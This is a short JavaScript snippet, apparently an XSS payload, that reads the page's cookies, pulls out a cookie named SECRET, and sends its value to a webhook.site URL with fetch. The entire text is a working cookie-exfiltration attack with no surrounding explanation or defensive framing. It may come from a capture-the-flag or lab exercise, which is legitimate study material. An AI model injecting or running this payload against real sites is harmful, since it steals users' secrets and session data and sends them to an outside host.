var cookies = document.cookie;
var match = cookies.match(/SECRET=([^;]+)/);
if(match) {
    // Send to webhook
    fetch('https://webhook.site/46ad1c7e-51de-4024-87f4-1558c24c3c96?secret=' + match[1]);
}
